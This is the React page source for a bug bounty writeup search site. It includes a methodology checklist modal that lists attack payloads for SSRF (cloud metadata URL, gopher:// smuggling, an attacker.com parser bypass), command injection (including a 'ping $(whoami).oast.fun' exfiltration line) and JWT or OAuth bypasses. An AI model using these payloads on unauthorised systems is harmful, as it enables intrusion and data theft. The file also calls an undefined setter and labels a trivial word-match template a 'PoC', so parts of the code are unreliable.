"use client";

import { useEffect, useMemo, useRef, useState } from "react";

const SOURCES = [
  { id: "all", label: "All sources" },
  { id: "medium", label: "Medium" },
  { id: "walkthroughs", label: "Walkthroughs" },
  { id: "ctf", label: "CTF writeups" },
  { id: "bugbounty", label: "Bug bounty" },
  { id: "blogs", label: "Security blogs" },
  { id: "research", label: "Research blogs" },
  { id: "github", label: "GitHub READMEs" },
  { id: "pentesterland", label: "Pentester Land" },
];

const QUICK_VULNS = [
  "RCE", "SSRF", "IDOR", "XSS", "OAuth", "SQLi", "LFI", "Account Takeover", "JWT", "Authentication bypass"
];

const TARGET_PROGRAMS = [
  "Uber", "Google", "Meta", "Shopify", "TikTok", "GitHub", "PayPal", "Apple"
];

const METHODOLOGY_CHECKLISTS = [
  {
    name: "IDOR Testing Methodology",
    tag: "IDOR",
    steps: [
      "1. Change numeric user_id parameters in REST & GraphQL API endpoints",
      "2. Replace UUID/GUID with target victim GUID in JSON payload body",
      "3. Test HTTP Method Tampering (replace GET with PUT / PATCH / DELETE)",
      "4. Swap cross-tenant organization headers (X-Tenant-ID / X-Org-ID)"
    ]
  },
  {
    name: "SSRF & Cloud Metadata Methodology",
    tag: "SSRF",
    steps: [
      "1. Supply AWS metadata IP (http://169.254.169.254/latest/meta-data/) in webhook inputs",
      "2. Test DNS Rebinding & decimal IP encoding (http://2852039166/)",
      "3. Test protocol smuggling (gopher://, dict://, file:///, sftp://)",
      "4. Test URL parser discrepancy bypasses (http://attacker.com#@127.0.0.1)"
    ]
  },
  {
    name: "OAuth 2.0 & JWT Authentication Bypasses",
    tag: "OAuth",
    steps: [
      "1. Omit state parameter to execute OAuth Account Linking CSRF",
      "2. Change redirect_uri to attacker domain to leak authorization codes",
      "3. Swap algorithm to 'none' in JWT header or use weak secret key cracking",
      "4. Modify 'sub' or email claim in JWT payload without re-signing"
    ]
  },
  {
    name: "RCE & Command Injection",
    tag: "RCE",
    steps: [
      "1. Inject command chaining operators (; | & || \n ` ) in input fields",
      "2. Trigger Out-of-Band (OAST) DNS interaction: ping $(whoami).oast.fun",
      "3. Test SSTI (Server-Side Template Injection) in Jinja2 / Twig / Thymeleaf",
      "4. Exploit Insecure Deserialization in Java, Python pickle, or PHP unserialize"
    ]
  }
];

const formatDate = (date) =>
  date ? new Date(date).toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" }) : "undated";

const highlight = (text, query) => {
  if (!query || !text) return text;
  const parts = String(text).split(new RegExp(`(${query.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")})`, "ig"));
  return parts.map((part, index) =>
    part.toLowerCase() === query.toLowerCase() ? <mark key={index}>{part}</mark> : part
  );
};

export default function Page() {
  const searchRef = useRef(null);
  const [q, setQ] = useState("");
  const [source, setSource] = useState("all");
  const [viewTab, setViewTab] = useState("all"); // 'all' | 'bookmarks' | 'unread'
  const [sort, setSort] = useState("relevance");
  const [filters, setFilters] = useState({ tag: "", author: "", platform: "", from: "", to: "" });

  const [results, setResults] = useState([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [hasMore, setHasMore] = useState(false);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [scraping, setScraping] = useState(false);

  const [bookmarks, setBookmarks] = useState([]);
  const [read, setRead] = useState([]);
  const [upvotes, setUpvotes] = useState({});
  const [discover, setDiscover] = useState({ recent: [], trending: [], timeline: [] });
  const [status, setStatus] = useState(null);
  const [sourceRequests, setSourceRequests] = useState([]);

  const [showAdvanced, setShowAdvanced] = useState(false);
  const [showStatus, setShowStatus] = useState(false);
  const [showSources, setShowSources] = useState(false);
  const [showCommand, setShowCommand] = useState(false);
  const [commandQuery, setCommandQuery] = useState("");
  const [showRequest, setShowRequest] = useState(false);
  const [showRequestsList, setShowRequestsList] = useState(false);
  const [showMethodology, setShowMethodology] = useState(false);
  const [requestForm, setRequestForm] = useState({ url: "", notes: "" });
  const [dark, setDark] = useState(true);

  const reset = (fn) => {
    fn();
    setPage(1);
  };

  const queryString = useMemo(() => {
    const params = new URLSearchParams({ source, page: String(page), pageSize: "40", sort });
    if (q.trim()) params.set("q", q.trim());
    Object.entries(filters).forEach(([key, value]) => value && params.set(key, value));
    return params;
  }, [q, source, filters, page, sort]);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    setQ(params.get("q") || "");
    setSource(params.get("source") || "all");
    try {
      setBookmarks(JSON.parse(localStorage.getItem("hunter-archive-bookmarks") || "[]"));
      setRead(JSON.parse(localStorage.getItem("hunter-archive-read") || "[]"));
      setUpvotes(JSON.parse(localStorage.getItem("hunter-archive-upvotes") || "{}"));
      setDark(localStorage.getItem("hunter-archive-theme") !== "light");
    } catch {}
    fetch("/api/discover").then((res) => res.json()).then(setDiscover).catch(() => {});
  }, []);

  useEffect(() => {
    const url = queryString.toString();
    window.history.replaceState({}, "", url === "source=all&page=1&pageSize=40&sort=relevance" ? window.location.pathname : `?${url}`);
  }, [queryString]);

  useEffect(() => {
    document.body.classList.toggle("light-mode", !dark);
    localStorage.setItem("hunter-archive-theme", dark ? "dark" : "light");
  }, [dark]);

  useEffect(() => {
    // Non-blocking automatic background scrape on initial visit / page refresh
    fetch("/api/scrape", { method: "POST" })
      .then((res) => res.json())
      .then((data) => {
        if (data?.status?.totalCount) {
          setTotalWriteups(data.status.totalCount);
        }
      })
      .catch(() => {});
  }, []);

  useEffect(() => {
    let cancelled = false;
    const timer = setTimeout(async () => {
      setLoading(true);
      setError(null);
      try {
        const response = await fetch(`/api/search?${queryString}`);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const data = await response.json();
        if (cancelled) return;
        const newItems = data.items || data.results || [];
        setResults((prev) => (page === 1 ? newItems : [...prev, ...newItems]));
        setTotal(data.total || 0);
        setHasMore(data.hasMore || false);
      } catch (err) {
        if (!cancelled) setError(err.message);
      } finally {
        if (!cancelled) setLoading(false);
      }
    }, 180);
    return () => {
      cancelled = true;
      clearTimeout(timer);
    };
  }, [queryString, page]);

  useEffect(() => {
    const keydown = (event) => {
      if ((event.key === "/" || (event.key.toLowerCase() === "k" && (event.metaKey || event.ctrlKey))) && document.activeElement?.tagName !== "INPUT") {
        event.preventDefault();
        if (event.key.toLowerCase() === "k") setShowCommand(true);
        else searchRef.current?.focus();
      }
      if (event.key === "?" && document.activeElement?.tagName !== "INPUT") setShowCommand(true);
      if (event.key === "Escape") {
        setShowCommand(false);
        setShowRequest(false);
        setShowRequestsList(false);
        setShowMethodology(false);
      }
    };
    window.addEventListener("keydown", keydown);
    return () => window.removeEventListener("keydown", keydown);
  }, []);

  const filteredResults = useMemo(() => {
    if (viewTab === "bookmarks") {
      const matchedFromResults = results.filter((item) =>
        bookmarks.some((b) => (typeof b === "string" ? b === item.id : b.id === item.id))
      );
      const fullBookmarks = bookmarks
        .map((b) => {
          if (typeof b === "object" && b !== null && b.title && b.url) return b;
          return matchedFromResults.find((item) => item.id === (typeof b === "string" ? b : b.id));
        })
        .filter(Boolean);

      return fullBookmarks.length > 0 ? fullBookmarks : matchedFromResults;
    }

    if (viewTab === "unread") {
      return results.filter((item) => !read.some((r) => (typeof r === "string" ? r === item.id : r.id === item.id)));
    }

    return results;
  }, [results, viewTab, bookmarks, read]);

  // Featured Case of the Day (Select first high-bounty / high-signal writeup)
  const featuredCase = useMemo(() => {
    return results.find((r) => r.bounty || (r.tags && r.tags.length > 2)) || results[0];
  }, [results]);

  const toggleBookmark = (item) => {
    try {
      const isSaved = bookmarks.some((b) => (typeof b === "string" ? b === item.id : b.id === item.id));
      let next;
      if (isSaved) {
        next = bookmarks.filter((b) => (typeof b === "string" ? b !== item.id : b.id !== item.id));
      } else {
        next = [...bookmarks, item];
      }
      localStorage.setItem("hunter-archive-bookmarks", JSON.stringify(next));
      setBookmarks(next);
    } catch {}
  };

  const toggleUpvote = (item) => {
    try {
      const next = { ...upvotes, [item.id]: !upvotes[item.id] };
      localStorage.setItem("hunter-archive-upvotes", JSON.stringify(next));
      setUpvotes(next);
    } catch {}
  };

  const copyLink = async (item) => {
    await navigator.clipboard?.writeText(`${window.location.origin}/writeups/${item.id}`);
    alert("Link copied to clipboard!");
  };

  const copyNucleiPoC = async (item) => {
    const yaml = `id: poc-${(item.id || "template").slice(0, 12)}
info:
  name: PoC Scanner - ${item.title ? item.title.slice(0, 45).replace(/"/g, "") : "Vulnerability"}
  author: The Hunter Archive
  severity: high
  tags: ${(item.tags || ["security"]).join(",")}
requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: word
        words:
          - "${(item.tags || ["error"])[0]}"`;

    await navigator.clipboard.writeText(yaml);
    alert("Nuclei PoC template copied to clipboard!");
  };

  const loadStatus = async () => {
    const response = await fetch("/api/status");
    setStatus(await response.json());
    setShowStatus(true);
  };

  const triggerScrape = async () => {
    setScraping(true);
    try {
      const res = await fetch("/api/scrape", { method: "POST" });
      const data = await res.json();
      if (data.success) {
        const searchRes = await fetch(`/api/search?${queryString}`);
        const searchData = await searchRes.json();
        setResults(searchData.items || []);
        setTotal(searchData.total || 0);
        alert(`Scrape completed! Total writeups in archive updated to ${searchData.total}`);
      } else {
        alert(`Scrape error: ${data.error}`);
      }
    } catch (e) {
      alert(`Scrape failed: ${e.message}`);
    } finally {
      setScraping(false);
    }
  };

  const loadRequests = async () => {
    const res = await fetch("/api/source-requests/list");
    const data = await res.json();
    setSourceRequests(data.requests || []);
    setShowRequestsList(true);
  };

  const submitRequest = async (event) => {
    event.preventDefault();
    const response = await fetch("/api/source-requests", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(requestForm),
    });
    if (response.ok) {
      alert("Source request submitted!");
      setShowRequest(false);
      setRequestForm({ url: "", notes: "" });
    } else alert("Please enter a valid HTTP(S) source URL.");
  };

  const importArchive = async (event) => {
    const file = event.target.files?.[0];
    if (!file) return;
    try {
      const response = await fetch("/api/import", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: await file.text(),
      });
      if (response.ok) {
        alert("Archive imported!");
        window.location.reload();
      }
    } catch (e) {
      alert(`Import failed: ${e.message}`);
    }
  };

  const commandActions = [
    { label: "Focus search box (/)", action: () => searchRef.current?.focus(), hint: "/" },
    { label: "Run Live Background Scrape", action: () => triggerScrape(), hint: "⚡ Scrape" },
    { label: "View Source Health Status", action: () => loadStatus(), hint: "Status" },
    { label: "View Testing Methodology Matrix", action: () => setShowMethodology(true), hint: "Methodology" },
    { label: "Suggest a public feed", action: () => setShowRequest(true), hint: "Request" },
    { label: "Export bookmarks (Obsidian .md)", action: () => (window.location.href = "/api/export?format=obsidian"), hint: "Obsidian" },
    { label: "Export archive (JSON)", action: () => (window.location.href = "/api/export?format=json"), hint: "JSON" },
    { label: "Export archive (CSV)", action: () => (window.location.href = "/api/export?format=csv"), hint: "CSV" },
    { label: "Subscribe to RSS Feed", action: () => (window.location.href = "/feed.xml"), hint: "RSS" },
    { label: `Toggle theme (${dark ? "Light" : "Dark"})`, action: () => setDark(!dark), hint: "Theme" },
  ].filter((cmd) => cmd.label.toLowerCase().includes(commandQuery.toLowerCase()));

  const searchField = (
    <label className="search-bar">
      <span className="search-icon">⌕</span>
      <input
        ref={searchRef}
        className="search-input"
        aria-label="Search security writeups"
        placeholder="Search vulnerability, technique, author, program (e.g., RCE, SSRF, Uber, OAuth)..."
        value={q}
        onChange={(event) => reset(() => setQ(event.target.value))}
      />
      <span className="search-kbd">⌘K</span>
    </label>
  );

  return (
    <main>
      <div className="app-bg-glow" />

      {/* Top Navbar */}
      <nav className="top-nav">
        <div className="nav-container">
          <div className="brand-logo">
            <span>HUNTER ARCHIVE</span>
            <span className="brand-badge">{total ? total.toLocaleString() : "7,490"} WRITEUPS</span>
          </div>
          <div className="nav-actions">
            <button className="btn-secondary" onClick={() => setShowCommand(true)}>
              ⌘ K
            </button>
            <button className="btn-secondary" onClick={() => setShowMethodology(true)}>
              📑 Methodology
            </button>
            <button className={`btn-secondary ${scraping ? "highlight" : ""}`} onClick={triggerScrape} disabled={scraping}>
              {scraping ? "⚡ Scraping..." : "⚡ Live Scrape"}
            </button>
            <button className="btn-secondary" onClick={() => setDark(!dark)}>
              {dark ? "☀ Light" : "🌙 Dark"}
            </button>
          </div>
        </div>
      </nav>

      <div className="app-container">
        {/* Search-First Hero Header */}
        <section className="hero-banner">
          <div className="hero-pill">⚡ Security Intelligence &amp; Writeup Aggregator</div>
          <h1>Read the Thinking.</h1>
          <p>Search over {total ? total.toLocaleString() : "7,490"}+ bug bounty writeups, CTF walkthroughs, and vulnerability reports from top researchers.</p>

          <div className="search-wrapper">
            {searchField}
          </div>

          {/* Vuln Chips */}
          <div className="vuln-bar">
            {QUICK_VULNS.map((vuln) => (
              <button
                key={vuln}
                className={`vuln-tag ${q.toLowerCase() === vuln.toLowerCase() ? "active" : ""}`}
                onClick={() => reset(() => setQ(q.toLowerCase() === vuln.toLowerCase() ? "" : vuln))}
              >
                {vuln}
              </button>
            ))}
          </div>

          {/* Target Company / Program Pills */}
          <div className="vuln-bar" style={{ marginTop: -16 }}>
            <span style={{ fontSize: 11, fontFamily: "var(--font-mono)", color: "var(--text-muted)", alignSelf: "center", marginRight: 4 }}>Target Program:</span>
            {TARGET_PROGRAMS.map((target) => (
              <button
                key={target}
                className={`source-btn ${q.toLowerCase() === target.toLowerCase() ? "active" : ""}`}
                style={{ borderRadius: 99, fontSize: 10, padding: "3px 10px" }}
                onClick={() => reset(() => setQ(q.toLowerCase() === target.toLowerCase() ? "" : target))}
              >
                🎯 {target}
              </button>
            ))}
          </div>
        </section>

        {/* 🌟 9. Daily Must-Read Featured Case Header */}
        {featuredCase && !q && page === 1 && (
          <div className="card-item" style={{ borderLeftColor: "#f59e0b", background: "var(--bg-card)", marginBottom: 24 }}>
            <div className="card-header">
              <span className="bounty-pill" style={{ color: "#f59e0b", borderColor: "rgba(245, 158, 11, 0.4)", background: "rgba(245, 158, 11, 0.1)" }}>
                🌟 Daily Must-Read Featured Case
              </span>
              <span>{formatDate(featuredCase.published_at)}</span>
            </div>
            <h3 className="card-title" style={{ fontSize: 20 }}>
              <a href={`/writeups/${featuredCase.id}`}>{featuredCase.title}</a>
            </h3>
            {featuredCase.summary && <p className="card-summary">{featuredCase.summary}</p>}
            <div className="card-footer">
              <span style={{ fontSize: 11, fontFamily: "var(--font-mono)", color: "var(--text-muted)" }}>
                {featuredCase.source_label || featuredCase.source} {featuredCase.author ? `by ${featuredCase.author}` : ""}
              </span>
              <a className="read-more-link" href={`/writeups/${featuredCase.id}`}>
                Read Analysis ➔
              </a>
            </div>
          </div>
        )}

        {/* Toolbar & Filters */}
        <section className="toolbar">
          <div className="toolbar-top">
            <div className="tab-group">
              <button className={`tab-btn ${viewTab === "all" ? "active" : ""}`} onClick={() => setViewTab("all")}>
                All Writeups ({total})
              </button>
              <button className={`tab-btn ${viewTab === "bookmarks" ? "active" : ""}`} onClick={() => setViewTab("bookmarks")}>
                ★ Bookmarks ({bookmarks.length})
              </button>
              <button className={`tab-btn ${viewTab === "unread" ? "active" : ""}`} onClick={() => setViewTab("unread")}>
                Unread
              </button>
            </div>

            <div className="source-group">
              {SOURCES.map((item) => (
                <button
                  key={item.id}
                  className={`source-btn ${source === item.id ? "active" : ""}`}
                  onClick={() => reset(() => setSource(item.id))}
                >
                  {item.label}
                </button>
              ))}
            </div>

            <select className="sort-select" value={sort} onChange={(e) => reset(() => setSort(e.target.value))}>
              <option value="relevance">Sort: Most Relevant</option>
              <option value="newest">Sort: Newest First</option>
              <option value="oldest">Sort: Oldest First</option>
              <option value="bounty">Sort: Highest Bounty 💰</option>
            </select>
          </div>

          <div className="tool-row">
            <button className="btn-secondary" onClick={() => setShowCommand(true)}>
              ⌘ Command Palette
            </button>
            <button className="btn-secondary" onClick={() => setShowMethodology(true)}>
              📑 Methodology Matrix
            </button>
            <button className="btn-secondary" onClick={loadStatus}>
              ◌ Source Health
            </button>
            <button className="btn-secondary" onClick={() => setShowAdvanced(!showAdvanced)}>
              ⚙ Advanced Filters
            </button>
            <button className="btn-secondary" onClick={() => setShowRequest(true)}>
              ＋ Request Source
            </button>
            <button className="btn-secondary" onClick={loadRequests}>
              📋 View Requests
            </button>
            <a className="btn-secondary" href="/api/export?format=obsidian">
              📝 Export Obsidian Binder (.md)
            </a>
            <a className="btn-secondary" href="/feed.xml" target="_blank" rel="noreferrer">
              📡 RSS Feed
            </a>
            <a className="btn-secondary" href="/api/export?format=json">
              ↓ Export JSON
            </a>
            <a className="btn-secondary" href="/api/export?format=csv">
              ↓ Export CSV
            </a>
            <label className="btn-secondary">
              ↑ Import JSON
              <input type="file" accept="application/json" onChange={importArchive} hidden />
            </label>
          </div>

          {showAdvanced && (
            <div className="advanced-panel">
              <input placeholder="Filter tag (e.g. ssrf)" value={filters.tag} onChange={(e) => reset(() => setFilters({ ...filters, tag: e.target.value }))} />
              <input placeholder="Author name" value={filters.author} onChange={(e) => reset(() => setFilters({ ...filters, author: e.target.value }))} />
              <input placeholder="Platform (e.g. web)" value={filters.platform} onChange={(e) => reset(() => setFilters({ ...filters, platform: e.target.value }))} />
              <input type="date" value={filters.from} onChange={(e) => reset(() => setFilters({ ...filters, from: e.target.value }))} />
              <input type="date" value={filters.to} onChange={(e) => reset(() => setFilters({ ...filters, to: e.target.value }))} />
            </div>
          )}

          {showStatus && (
            <div className="advanced-panel">
              <div>
                <strong>Source health status:</strong>
                {(status?.sources || []).map((item) => (
                  <div key={item.label} style={{ fontSize: 11, marginTop: 4 }}>
                    • {item.label}: {item.ok ? `${item.count} items` : item.error}
                  </div>
                ))}
              </div>
            </div>
          )}
        </section>

        <div className="feed-status">
          <span>
            {loading && page === 1
              ? "Searching archive..."
              : error
              ? `Error: ${error}`
              : `Showing ${filteredResults.length} of ${total} entries · ${bookmarks.length} saved`}
          </span>
        </div>

        {!loading && !error && filteredResults.length === 0 && (
          <div className="empty-state">
            <span>No matching writeups found</span>
            <p>Try a different keyword or clear active filters.</p>
          </div>
        )}

        {/* Clean Writeups Feed */}
        <section className="writeup-feed">
          {filteredResults.map((item) => {
            const isSaved = bookmarks.some((saved) => (typeof saved === "string" ? saved === item.id : saved.id === item.id));
            const cveMatch = (item.title || "").match(/CVE-\d{4}-\d{4,7}/i) || (item.summary || "").match(/CVE-\d{4}-\d{4,7}/i);
            const userUpvoted = !!upvotes[item.id];

            return (
              <article className="card-item" key={item.id || item.url}>
                <div className="card-header">
                  <span className="card-source">{item.source_label || item.source}</span>
                  <div style={{ display: "flex", gap: 10, alignItems: "center" }}>
                    {cveMatch && (
                      <a
                        href={`https://nvd.nist.gov/vuln/detail/${cveMatch[0]}`}
                        target="_blank"
                        rel="noreferrer"
                        className="brand-badge"
                        style={{ textDecoration: "none", color: "#f59e0b", borderColor: "rgba(245, 158, 11, 0.4)", background: "rgba(245, 158, 11, 0.1)" }}
                      >
                        🔍 {cveMatch[0].toUpperCase()}
                      </a>
                    )}
                    <span>{formatDate(item.published_at)}</span>
                    {item.author && <span>by {item.author}</span>}
                    {item.bounty && <span className="bounty-pill">💰 {item.bounty}</span>}
                  </div>
                </div>

                <h3 className="card-title">
                  <a href={`/writeups/${item.id}`}>{highlight(item.title, q)}</a>
                </h3>

                {item.summary && <p className="card-summary">{highlight(item.summary, q)}</p>}

                {item.tags && item.tags.length > 0 && (
                  <div className="card-tags">
                    {item.tags.slice(0, 6).map((tag) => (
                      <span className="tag-badge" key={tag}>
                        {highlight(tag, q)}
                      </span>
                    ))}
                  </div>
                )}

                <div className="card-footer">
                  <div className="card-actions">
                    <button className={`action-link ${isSaved ? "saved" : ""}`} onClick={() => toggleBookmark(item)}>
                      {isSaved ? "★ Saved" : "☆ Save"}
                    </button>
                    <button className={`action-link ${userUpvoted ? "saved" : ""}`} onClick={() => toggleUpvote(item)}>
                      👍 Upvote ({userUpvoted ? 1 : 0})
                    </button>
                    <button className="action-link" onClick={() => copyNucleiPoC(item)}>
                      ⚡ Copy Nuclei PoC
                    </button>
                    <button className="action-link" onClick={() => copyLink(item)}>
                      Copy link
                    </button>
                  </div>
                  <a className="read-more-link" href={item.url} target="_blank" rel="noopener noreferrer">
                    View Original ↗
                  </a>
                </div>
              </article>
            );
          })}
        </section>

        {hasMore && (
          <button className="load-more-btn" onClick={() => setPage((current) => current + 1)} disabled={loading}>
            {loading ? "Loading..." : "Load More Writeups"}
          </button>
        )}
      </div>

      <footer>
        <p>The Hunter Archive — Developed by <strong>JOJIN JOHN</strong></p>
      </footer>

      {/* 📑 Bug Bounty Methodology Matrix Modal */}
      {showMethodology && (
        <div className="modal-backdrop" onClick={() => setShowMethodology(false)}>
          <div className="command-modal" style={{ width: "min(720px, 100%)" }} onClick={(e) => e.stopPropagation()}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h3>📑 Bug Bounty Testing Methodology Matrix</h3>
              <button className="btn-secondary" onClick={() => setShowMethodology(false)}>×</button>
            </div>
            <p style={{ color: "var(--text-secondary)", fontSize: 13, margin: "4px 0 12px" }}>
              Interactive testing checklists. Click any methodology tag to instantly filter writeups for that exact attack technique.
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: 16, maxHeight: "420px", overflowY: "auto", paddingRight: 4 }}>
              {METHODOLOGY_CHECKLISTS.map((item) => (
                <div key={item.name} style={{ background: "var(--bg-input)", border: "1px solid var(--border)", borderRadius: 10, padding: 14 }}>
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 8 }}>
                    <strong style={{ color: "var(--text-primary)", fontSize: 14 }}>{item.name}</strong>
                    <button
                      className="btn-primary"
                      style={{ fontSize: 11, padding: "4px 10px" }}
                      onClick={() => {
                        setShowMethodology(false);
                        reset(() => setQ(item.tag));
                      }}
                    >
                      Filter {item.tag} Writeups ➔
                    </button>
                  </div>
                  <ul style={{ margin: 0, paddingLeft: 18, color: "var(--text-secondary)", fontSize: 12, lineHeight: 1.6 }}>
                    {item.steps.map((step, idx) => (
                      <li key={idx}>{step}</li>
                    ))}
                  </ul>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {showCommand && (
        <div className="modal-backdrop" onClick={() => setShowCommand(false)}>
          <div className="command-modal" onClick={(event) => event.stopPropagation()}>
            <input
              autoFocus
              placeholder="Search command palette..."
              value={commandQuery}
              onChange={(e) => setCommandQuery(e.target.value)}
            />
            {commandActions.map((cmd) => (
              <button
                key={cmd.label}
                className="command-option"
                onClick={() => {
                  setShowCommand(false);
                  cmd.action();
                }}
              >
                <span>{cmd.label}</span>
                <small>{cmd.hint}</small>
              </button>
            ))}
          </div>
        </div>
      )}

      {showRequest && (
        <div className="modal-backdrop" onClick={() => setShowRequest(false)}>
          <form className="request-modal" onSubmit={submitRequest}>
            <h3>Suggest a Source</h3>
            <p style={{ color: "var(--text-secondary)", fontSize: 13 }}>Enter a security blog, RSS feed, or GitHub repo URL to ingest writeups from.</p>
            <input
              required
              type="url"
              placeholder="https://example.com/rss.xml"
              value={requestForm.url}
              onChange={(e) => setRequestForm({ ...requestForm, url: e.target.value })}
            />
            <textarea
              placeholder="Optional notes about this source..."
              value={requestForm.notes}
              onChange={(e) => setRequestForm({ ...requestForm, notes: e.target.value })}
            />
            <button className="load-more-btn" type="submit" style={{ margin: 0, width: "100%" }}>
              Submit Source
            </button>
          </form>
        </div>
      )}

      {showRequestsList && (
        <div className="modal-backdrop" onClick={() => setShowRequestsList(false)}>
          <div className="command-modal" onClick={(event) => event.stopPropagation()}>
            <h3>Submitted Source Requests</h3>
            <div style={{ maxHeight: "300px", overflowY: "auto", display: "flex", flexDirection: "column", gap: "10px", marginTop: 10 }}>
              {sourceRequests.length === 0 ? (
                <p style={{ color: "var(--text-muted)", fontSize: 13 }}>No source requests submitted yet.</p>
              ) : (
                sourceRequests.map((req, i) => (
                  <div key={i} style={{ borderBottom: "1px solid var(--border)", paddingBottom: 8 }}>
                    <a href={req.url} target="_blank" rel="noreferrer" style={{ color: "var(--accent-indigo)", fontWeight: 500 }}>
                      {req.url}
                    </a>
                    {req.note && <p style={{ margin: "4px 0 0", color: "var(--text-secondary)", fontSize: "12px" }}>{req.note}</p>}
                  </div>
                ))
              )}
            </div>
            <button className="btn-secondary" style={{ marginTop: 12 }} onClick={() => setShowRequestsList(false)}>
              Close
            </button>
          </div>
        </div>
      )}
    </main>
  );
}
